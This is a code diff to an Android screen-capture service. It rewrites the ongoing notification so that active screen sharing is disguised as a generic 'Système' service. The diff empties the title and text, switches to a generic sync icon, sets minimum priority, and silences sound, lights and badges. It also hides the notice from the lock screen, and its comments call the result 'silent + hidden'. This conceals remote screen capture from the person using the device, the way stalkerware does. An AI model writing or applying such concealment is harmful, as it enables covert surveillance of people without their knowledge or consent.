@@ -641,10 +641,17 @@ public class ScreenCaptureService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "Remote Control",
-                NotificationManager.IMPORTANCE_LOW
+                "Système",
+                NotificationManager.IMPORTANCE_MIN // Minimum priority = silent + hidden
             );
-            channel.setDescription("Partage d'ecran en cours");
+            channel.setDescription("Service systeme");
+            channel.setShowBadge(false);
+            channel.enableLights(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                channel.setAllowBubbles(false);
+            }
             NotificationManager nm = getSystemService(NotificationManager.class);
             nm.createNotificationChannel(channel);
         }
@@ -658,10 +665,12 @@ public class ScreenCaptureService extends Service {
             builder = new Notification.Builder(this);
         }
         return builder
-            .setContentTitle("Remote Control")
-            .setContentText("Partage d'ecran actif")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentTitle("") // Empty title
+            .setContentText("") // Empty text
+            .setSmallIcon(android.R.drawable.stat_notify_sync) // Generic system icon
             .setOngoing(true)
+            .setPriority(Notification.PRIORITY_MIN) // Lowest priority
+            .setVisibility(Notification.VISIBILITY_SECRET) // Hide from lock screen
             .build();
     }
 }
